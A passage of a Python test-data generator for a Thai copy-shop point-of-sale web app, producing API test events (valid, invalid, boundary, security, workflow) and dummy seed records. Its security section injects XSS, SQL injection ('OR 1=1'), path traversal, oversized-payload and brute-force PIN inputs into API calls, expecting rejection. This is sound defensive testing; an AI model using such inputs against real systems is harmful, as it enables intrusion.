        ("Customers", "name", {"phone": "0812345678"}, "POST /api/customers"),
        ("Job_Orders", "customer_name", {"details": "งาน", "qty": 1, "deposit": 0}, "POST /api/jobs"),
        ("Job_Orders", "details", {"customer_name": "ลูกค้า", "qty": 1, "deposit": 0}, "POST /api/jobs"),
        ("Expenses", "description", {"amount": 100, "expense_type": "OPEX"}, "POST /api/expenses"),
        ("Sales", "notes", {"items": [{"id": 1, "qty": 1, "price": 50, "type": "Retail"}], "payment_method": "Cash", "payment_status": "Paid"}, "POST /api/sales"),
        ("Stock_WriteOffs", "reason", {"product_id": 1, "qty": 1}, "POST /api/inventory/writeoff"),
    ]
    for i in range(n):
        entity, field, base, action = random.choice(targets)
        xss = random.choice(XSS_PAYLOADS)
        payload = {**base, field: xss}
        events.append(make_event("security_xss", entity, f"{action} (XSS in {field})",
                                 payload, 400, f"XSS: {xss[:60]}"))
    return events

def gen_security_sqli(n=45):
    events = []
    for i in range(n - 5):
        sql = random.choice(SQL_INJECTION_PAYLOADS)
        field = random.choice(["name", "brand", "barcode", "customer_name", "details", "description", "reason", "notes", "username"])
        events.append(make_event("security_sqli", "Various", f"SQLi injection in field={field}",
                                 {field: sql, "type": "Retail", "price": 10, "cost": 5},
                                 400, f"SQLi: {sql[:60]}"))
    for sql in random.sample(SQL_INJECTION_PAYLOADS, 5):
        events.append(make_event("security_sqli", "Products_Services", "GET /api/products/search?q=",
                                 {"q": sql}, 200, f"Search SQLi (should sanitize): {sql[:50]}"))
    return events

def gen_security_misc(n=30):
    events = []
    for pt in PATH_TRAVERSAL_PAYLOADS[:4]:
        events.append(make_event("security_misc", "Products_Services", "GET /api/products/search (path traversal)",
                                 {"q": pt}, 400, f"Path traversal: {pt}"))
    for sc in SPECIAL_CHARS[:4]:
        events.append(make_event("security_misc", "Customers", "POST /api/customers (special chars)",
                                 {"name": sc, "phone": "0812345678"}, 400, "Special chars in name"))
    events.append(make_event("security_misc", "Products_Services", "POST /api/products (huge payload)",
                             {"name": "X" * 100000, "type": "Retail", "price": 10, "cost": 5}, 400, "Oversized name DoS"))
    for invalid_id in [0, -1, 999999, "abc", "' OR 1=1"]:
        events.append(make_event("security_misc", "Products_Services", f"DELETE /api/products/{invalid_id}",
                                 {}, 404, f"Invalid product_id in URL: {invalid_id}"))
    events.append(make_event("security_misc", "Auth", "GET / (no session)", {"_session": None}, 302, "Access without login"))
    for i in range(6):
        events.append(make_event("security_misc", "Auth", "POST /login (wrong PIN)",
                                 {"pin": str(random.randint(1000, 9999))}, 400, f"Brute force attempt #{i+1}"))
    events.append(make_event("security_misc", "Sales", "POST /api/sales (wrong Content-Type)",
                             {"_note": "send as text/plain"}, 400, "Wrong Content-Type header"))
    return events[:n]

# ─────────────────────────────────────────────
# DIMENSION 5 — STATE / WORKFLOW EVENTS
# ─────────────────────────────────────────────
def gen_workflow_product_lifecycle(n=30):
    """Create → Update → Price Edit → Stock Add → WriteOff → Deactivate"""
    events = []
    for i in range(max(1, n // 6)):
        pid = i + 100
        events += [
            make_event("workflow", "Products_Services", f"[1/6] Create #{pid}",
                       {"name": f"TestProd-{pid}", "type": "Retail", "price": 100, "cost": 60, "stock_qty": 50}, 201, "Lifecycle step 1"),
            make_event("workflow", "Products_Services", f"[2/6] Update #{pid}",
                       {"name": f"TestProd-{pid} v2", "price": 110, "cost": 60, "type": "Retail",
                        "stock_qty": 50, "reorder_level": 5, "barcode": str(random.randint(10000000, 99999999))}, 200, "Step 2: update"),
            make_event("workflow", "Products_Services", f"[3/6] Price edit #{pid}",
                       {"price": 120, "cost": 65}, 200, "Step 3: price edit"),
            make_event("workflow", "Products_Services", f"[4/6] Stock add #{pid}",
                       {"add_qty": 20}, 200, "Step 4: stock add"),
            make_event("workflow", "Stock_WriteOffs", f"[5/6] WriteOff #{pid}",
                       {"product_id": pid, "qty": 5, "reason": "ชำรุด"}, 200, "Step 5: write-off"),
            make_event("workflow", "Products_Services", f"[6/6] Deactivate #{pid}",
                       {}, 200, f"DELETE /api/products/{pid} — Step 6"),
        ]
    return events[:n]

def gen_workflow_sale_hold_resume(n=30):
    """Create Hold → List Held → Pull/Cancel"""
    events = []
    for i in range(max(1, n // 3)):
        sid = i + 200
        events += [
            make_event("workflow", "Sales", f"[1/3] Create HOLD #{sid}",
                       {"items": [{"id": 1, "qty": 2, "price": 50, "type": "Stationery"}],
                        "payment_method": "Cash", "payment_status": "Hold"}, 201, "Hold step 1"),
            make_event("workflow", "Sales", f"[2/3] List held sales",
                       {}, 200, "GET /api/sales/held"),
            make_event("workflow", "Sales", f"[3/3] Pull/cancel held #{sid}",
                       {}, 200, f"DELETE /api/sales/held/{sid}"),
        ]
    return events[:n]

def gen_workflow_credit_sale(n=30):
    """Unpaid Sale → Partial Pay → Full Pay"""
    events = []
    for i in range(max(1, n // 3)):
        sid = i + 300
        events += [
            make_event("workflow", "Sales", f"[1/3] Create UNPAID #{sid}",
                       {"items": [{"id": 1, "qty": 3, "price": 100, "type": "Retail"}],
                        "payment_method": "Cash", "payment_status": "Unpaid", "customer_id": 1}, 201, "Credit step 1"),
            make_event("workflow", "Customer_Credit", f"[2/3] Partial pay #{sid}",
                       {"pay_amount": 150, "payment_method": "Cash"}, 200, f"PUT /api/sales/{sid}/pay — partial"),
            make_event("workflow", "Customer_Credit", f"[3/3] Full pay #{sid}",
                       {"pay_amount": 150, "payment_method": "PromptPay"}, 200, f"PUT /api/sales/{sid}/pay — final"),
        ]
    return events[:n]

def gen_workflow_job_lifecycle(n=30):
    """Create → กำลังผลิต → รอรับสินค้า → Complete"""
    events = []
    for i in range(max(1, n // 4)):
        jid = i + 400
        events += [
            make_event("workflow", "Job_Orders", f"[1/4] Create job #{jid}",
                       {"customer_name": f"ลูกค้า-{jid}", "details": "พิมพ์เอกสาร", "qty": 10, "deposit": 100}, 201, "Job step 1"),
            make_event("workflow", "Job_Orders", f"[2/4] → กำลังผลิต #{jid}",
                       {"status": "กำลังผลิต"}, 200, f"PUT /api/jobs/{jid}"),
            make_event("workflow", "Job_Orders", f"[3/4] → รอรับสินค้า #{jid}",
                       {"status": "รอรับสินค้า"}, 200, f"PUT /api/jobs/{jid}"),
            make_event("workflow", "Job_Orders", f"[4/4] Complete job #{jid}",
                       {"total_amount": 500, "discount": 0, "payment_method": "Cash", "payment_status": "Paid"}, 200,
                       f"POST /api/jobs/{jid}/complete"),
        ]
    return events[:n]

def gen_workflow_void_sale(n=20):
    """Create Sale → Void"""
    events = []
    for i in range(max(1, n // 2)):
        sid = i + 500
        events += [
            make_event("workflow", "Sales", f"[1/2] Create sale #{sid} (to void)",
                       {"items": [{"id": 1, "qty": 1, "price": 200, "type": "Retail"}],
                        "payment_method": "Cash", "payment_status": "Paid"}, 201, "Void step 1"),
            make_event("workflow", "Sales", f"[2/2] Void sale #{sid}",
                       {}, 200, f"POST /api/sales/{sid}/void"),
        ]
    return events[:n]

def gen_workflow_customer_loyalty(n=30):
    """Register → Buy Brewed Drink (earn) → Redeem → Verify Balance"""
    events = []
    for i in range(max(1, n // 5)):
        cid = i + 600
        events += [
            make_event("workflow", "Customers", f"[1/5] Register VIP #{cid}",
                       {"name": f"VIP {cid}", "phone": f"081{random.randint(1000000,9999999)}"}, 201, "Loyalty step 1"),
            make_event("workflow", "Sales", f"[2/5] Brewed drink sale (earn 5 pts) #{cid}",
                       {"items": [{"id": 6, "qty": 5, "price": 35, "type": "Brewed Drink"}],
                        "payment_method": "Cash", "payment_status": "Paid", "customer_id": cid, "redeemed_points": 0}, 201, "Loyalty step 2"),
            make_event("workflow", "Customers", f"[3/5] Check balance #{cid}",
                       {}, 200, "GET /api/customers — verify 5 pts earned"),
            make_event("workflow", "Sales", f"[4/5] Redeem 10 pts #{cid}",
                       {"items": [{"id": 6, "qty": 1, "price": 0, "type": "Brewed Drink", "is_redeemed": True}],
                        "payment_method": "Cash", "payment_status": "Paid", "customer_id": cid, "redeemed_points": 10}, 201, "Loyalty step 4"),
            make_event("workflow", "Customers", f"[5/5] Verify pts deducted #{cid}",
                       {}, 200, "GET /api/customers — verify deduction"),
        ]
    return events[:n]

def gen_workflow_purchase(n=20):
    """Create PO → Verify Stock Updated"""
    events = []
    for i in range(max(1, n // 2)):
        events += [
            make_event("workflow", "Purchases", f"[1/2] Create PO #{i}",
                       {"supplier_name": random.choice(SUPPLIERS), "has_vat": True,
                        "payment_method": "PromptPay",
                        "items": [{"id": random.randint(1, 10), "qty": 20, "cost": 40}]}, 201, "Purchase step 1"),
            make_event("workflow", "Inventory", f"[2/2] Verify stock after PO #{i}",
                       {}, 200, "GET /api/products — verify stock increase"),
        ]
    return events[:n]

def gen_workflow_login(n=20):
    """Login → Access protected → Logout"""
    events = []
    for i in range(max(1, n // 3)):
        events += [
            make_event("workflow", "Auth", f"[1/3] Login #{i}",
                       {"pin": "1234"}, 302, "Valid PIN → redirect /"),
            make_event("workflow", "Auth", f"[2/3] Access /pos #{i}",
                       {}, 200, "Session valid — GET /pos"),
            make_event("workflow", "Auth", f"[3/3] Logout #{i}",
                       {}, 302, "GET /logout → redirect /login"),
        ]
    return events[:n]

# ─────────────────────────────────────────────
# SEED DATA BY TABLE
# ─────────────────────────────────────────────
def generate_seed_db_data():
    seed = {}
    seed["Users"] = [
        {"username": "Admin", "role": "Admin", "pin": "1234"},
        {"username": "แคชเชียร์_1", "role": "Cashier", "pin": "2222"},
        {"username": "แคชเชียร์_2", "role": "Cashier", "pin": "3333"},
        {"username": "ผู้จัดการ", "role": "Manager", "pin": "9999"},
    ]
    seed["Products_Services"] = [
        {"name": p[0], "type": p[1], "barcode": p[2], "brand": p[3],
         "model": p[4], "color": p[5], "price": p[6], "cost": p[7],
         "stock_qty": p[8], "reorder_level": p[9], "is_active": 1}
        for p in [
            # (name, type, barcode, brand, model, color, price, cost, stock_qty, reorder_level)
            ("ถ่ายเอกสาร A4 ขาวดำ", "Service", None, "", "", "", 1, 0.30, 0, 0),
            ("ถ่ายเอกสาร A4 สี", "Service", None, "", "", "", 5, 2.00, 0, 0),
            ("พิมพ์เอกสาร A4 ขาวดำ (ลูกค้า)", "Service", None, "", "", "", 3, 1.00, 0, 0),
            ("เข้าเล่มสปิไรน์", "Service", None, "", "", "", 20, 5.00, 0, 0),
            ("ถ่ายบัตร", "Service", None, "", "", "", 5, 1.00, 0, 0),
            ("ชาไทย เย็น", "Brewed Drink", None, "", "", "", 35, 8.00, 50, 10),
            ("กาแฟเย็น", "Brewed Drink", None, "", "", "", 35, 10.00, 40, 10),
            ("โอวัลตินเย็น", "Brewed Drink", None, "", "", "", 35, 12.00, 30, 10),
            ("ชามะนาว เย็น", "Brewed Drink", None, "", "", "", 30, 7.00, 35, 10),
            ("ชาเขียว เย็น", "Brewed Drink", None, "", "", "", 35, 9.00, 25, 10),
            ("กระดาษ A4 Navigator 80g (รีม)", "Stationery", "88888881", "Navigator", "80g", "ขาว", 120, 85.00, 200, 20),
            ("ปากกา Pilot สีน้ำเงิน", "Stationery", "88888882", "Pilot", "BP-S", "น้ำเงิน", 10, 5.00, 500, 50),
            ("ดินสอ 2B Staedtler", "Stationery", "88888883", "Staedtler", "134", "เหลือง", 15, 6.00, 300, 30),
            ("แฟ้ม A4 สีน้ำเงิน", "Stationery", "88888884", "ตราช้าง", "A4", "น้ำเงิน", 25, 12.00, 100, 15),
            ("เทปใส 1 นิ้ว OPP", "Stationery", "88888885", "", "", "ใส", 20, 8.00, 150, 20),
            ("น้ำดำ Pepsi 325ml", "Soft drinks", "99999991", "Pepsi", "325ml", "", 15, 9.50, 120, 24),
            ("น้ำเขียว Sprite 325ml", "Soft drinks", "99999992", "Sprite", "325ml", "", 15, 9.50, 100, 24),
            ("น้ำส้ม Minute Maid 160ml", "Soft drinks", "99999993", "Minute Maid", "160ml", "", 12, 7.00, 80, 24),
            ("น้ำดื่ม Singha 600ml", "Water", "77777771", "สิงห์", "600ml", "", 7, 4.00, 200, 48),
            ("น้ำดื่ม Crystal 1.5L", "Water", "77777772", "คริสตัล", "1.5L", "", 15, 8.00, 100, 24),
            ("Flash Drive 32GB Kingston", "IT equipment", "66666661", "Kingston", "32GB USB3", "ดำ", 250, 180.00, 30, 5),
            ("สาย USB-C 1m", "IT equipment", "66666662", "", "USB-C", "ดำ", 90, 45.00, 20, 5),
            ("กรอบรูป 4x6", "Gift shop", "55555551", "", "4x6", "ขาว", 59, 30.00, 50, 10),
            ("สมุดโน้ต A5 ลายน่ารัก", "Gift shop", "55555552", "", "A5", "ชมพู", 45, 22.00, 60, 10),
            ("ลูกบอลยางขนาดเล็ก", "Toys", "44444441", "", "", "แดง", 25, 12.00, 40, 10),
            ("น้ำหอม Tester 50ml", "Perfume", "33333331", "", "Tester", "", 299, 150.00, 10, 2),
            ("ถุงพลาสติก (มัด 100 ใบ)", "Retail", "22222221", "", "", "", 15, 7.00, 300, 50),
            ("กล่องกระดาษ A4", "Retail", "22222222", "", "", "", 8, 3.00, 200, 50),
        ]
    ]
    seed["Customers"] = [
        {"name": c[0], "phone": c[1], "points": c[2], "allow_points_with_debt": c[3]}
        for c in [
            ("นางสาวสมใจ ใจดี", "0812345678", 50, 0),
            ("นายประสิทธิ์ มีทรัพย์", "0823456789", 0, 0),
            ("คุณมาลี สวยงาม", "0834567890", 120, 0),
            ("นายวิชัย เก่งกาจ", "0845678901", 30, 1),
            ("ร้านค้า ABC", "0856789012", 0, 0),
            ("บริษัท XYZ จำกัด", "0267890123", 200, 0),
            ("คุณสุดา รักดี", "0878901234", 10, 0),
            ("นายอานนท์ ชาญชัย", "0889012345", 0, 0),
            ("คุณนิดา เจ็ตสกี", "0890123456", 60, 0),
            ("นักเรียน ม.ปลาย", "0801234567", 80, 0),
        ]
    ]
    seed["Business_Date"] = [
        {"current_date": datetime.date.today().isoformat(), "is_closed": 0, "starting_cash": 500.0}
    ]
    seed["Promotions"] = [
        {"name": "ส่วนลดนักเรียน 10%", "promo_type": "percentage", "discount_value": 10,
         "condition_type": "min_amount", "condition_value": 100, "is_active": 1},
        {"name": "ลด 20 บาท เมื่อซื้อครบ 200 บาท", "promo_type": "fixed_amount", "discount_value": 20,
         "condition_type": "min_amount", "condition_value": 200, "is_active": 1},
        {"name": "ซื้อ 5 แถม 1 (เครื่องดื่ม)", "promo_type": "buy_x_get_y", "discount_value": 1,
         "condition_type": "min_qty", "condition_value": 5, "is_active": 1},
        {"name": "โปรเก่า (ยกเลิก)", "promo_type": "percentage", "discount_value": 5,
         "condition_type": None, "condition_value": None, "is_active": 0},
    ]
    return seed

# ─────────────────────────────────────────────
# ASSEMBLE & EXPORT
# ─────────────────────────────────────────────
def generate_all_events():
    print("🔧 Generating events by dimension...")
    all_events = []

    # Dimension 1: Happy Path (~505 events)
    all_events += gen_happy_path_users(25)
    all_events += gen_happy_path_products(100)
    all_events += gen_happy_path_customers(80)
    all_events += gen_happy_path_sales(140)
    all_events += gen_happy_path_purchases(40)
    all_events += gen_happy_path_jobs(40)
    all_events += gen_happy_path_expenses(50)
    all_events += gen_happy_path_writeoffs(30)

    # Dimension 2: Negative (~181 events)
    all_events += gen_negative_users(15)
    all_events += gen_negative_products(40)
    all_events += gen_negative_sales(40)
    all_events += gen_negative_customers(12)
    all_events += gen_negative_jobs(12)
    all_events += gen_negative_expenses(12)
    # Extra: invalid writeoffs
    for _ in range(25):
        bad_qty = random.choice([-1, 0, None, "abc", -999])
        all_events.append(make_event("negative", "Stock_WriteOffs",
                                     "POST /api/inventory/writeoff",
                                     {"product_id": random.choice([None, 0, -1, 99999]),
                                      "qty": bad_qty, "reason": "ชำรุด"},
                                     400, f"Invalid writeoff qty={bad_qty}"))
    # Extra: invalid purchases
    for _ in range(25):
        all_events.append(make_event("negative", "Purchases",
                                     "POST /api/purchases",
                                     {"supplier_name": random.choice(["", None]),
                                      "items": random.choice([[], None]),
                                      "has_vat": "yes"},
                                     400, "Invalid purchase: empty/null items"))

    # Dimension 3: Boundary (~140 events)
    all_events += gen_boundary_products(40)
    all_events += gen_boundary_sales(40)
    all_events += gen_boundary_customers(20)
    all_events += gen_boundary_jobs(20)
    all_events += gen_boundary_stock_count(20)

    # Dimension 4: Security (~115 events)
    all_events += gen_security_xss(40)
    all_events += gen_security_sqli(45)
    all_events += gen_security_misc(30)

    # Dimension 5: Workflow (~210 events)
    all_events += gen_workflow_product_lifecycle(30)
    all_events += gen_workflow_sale_hold_resume(30)
    all_events += gen_workflow_credit_sale(30)
    all_events += gen_workflow_job_lifecycle(30)
    all_events += gen_workflow_void_sale(20)
    all_events += gen_workflow_customer_loyalty(30)
    all_events += gen_workflow_purchase(20)
    all_events += gen_workflow_login(20)

    return all_events



def export_to_json(data, filename):
    path = os.path.join(OUTPUT_DIR, filename)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2, default=str)
    size_kb = os.path.getsize(path) // 1024
    if isinstance(data, list):
        print(f"  ✅ {filename}  ({len(data)} events, ~{size_kb} KB)")
    else:
        total = sum(len(v) for v in data.values()) if isinstance(data, dict) else "?"
        print(f"  ✅ {filename}  ({total} seed records, ~{size_kb} KB)")


def export_to_csv(events, filename):
    path = os.path.join(OUTPUT_DIR, filename)
    fields = ["event_id", "dimension", "entity", "action",
              "expected_http_status", "notes", "generated_at", "payload_json"]
    with open(path, "w", encoding="utf-8-sig", newline="") as f:
        w = csv.DictWriter(f, fieldnames=fields)
        w.writeheader()
        for ev in events:
            w.writerow({
                "event_id": ev["event_id"],
                "dimension": ev["dimension"],
                "entity": ev["entity"],
                "action": ev["action"],
                "expected_http_status": ev["expected_http_status"],
                "notes": ev["notes"],
                "generated_at": ev["generated_at"],
                "payload_json": json.dumps(ev["payload"], ensure_ascii=False, default=str),
            })
    size_kb = os.path.getsize(path) // 1024
    print(f"  ✅ {filename}  ({len(events)} rows, ~{size_kb} KB)")


def print_summary(events):
    from collections import Counter
    dims = Counter(e["dimension"] for e in events)
    statuses = Counter(e["expected_http_status"] for e in events)
    entities = Counter(e["entity"] for e in events)

    print(f"\n{'='*62}")
    print(f"  📋 TOTAL TEST EVENTS: {len(events)}")
    print(f"{'='*62}")

    print("\n📊 By Test Dimension:")
    dim_labels = {
        "happy_path": "1. Happy Path (Valid)",
        "negative":   "2. Negative / Invalid",
        "boundary":   "3. Boundary / Edge Cases",
        "security_xss":  "4a. Security – XSS",
        "security_sqli": "4b. Security – SQL Injection",
        "security_misc": "4c. Security – Misc",
        "workflow":   "5. State / Workflow",
    }
    for k, label in dim_labels.items():
        cnt = dims.get(k, 0)
        bar = "█" * (cnt // 8)
        print(f"  {label:<35} {cnt:>4}  {bar}")

    print("\n🗂️  Top 10 Entities Tested:")
    for entity, cnt in entities.most_common(10):
        print(f"  {entity:<35} {cnt:>4}")

    print("\n🔢 Expected HTTP Status Distribution:")
    for status in sorted(statuses):
        print(f"  HTTP {status}  →  {statuses[status]:>4}")
    print()


if __name__ == "__main__":
    print("\n" + "=" * 62)
    print("  PJ Copy Shop - Test Data Generator")
    print("  Target: 1,000+ events | 5 Test Dimensions")
    print("=" * 62 + "\n")

    events = generate_all_events()
    print_summary(events)

    print("Exporting files...")
    export_to_json(events, "test_data_events.json")
    export_to_csv(events, "test_data_events.csv")

    seed = generate_seed_db_data()
    export_to_json(seed, "test_data_db_seed.json")

    print(f"\nDone! Output directory: {OUTPUT_DIR}")
    print("   - test_data_events.json   : all test events (API/unit test input)")
    print("   - test_data_events.csv    : flat CSV (spreadsheet / test management)")
    print("   - test_data_db_seed.json  : structured seed data by DB table")
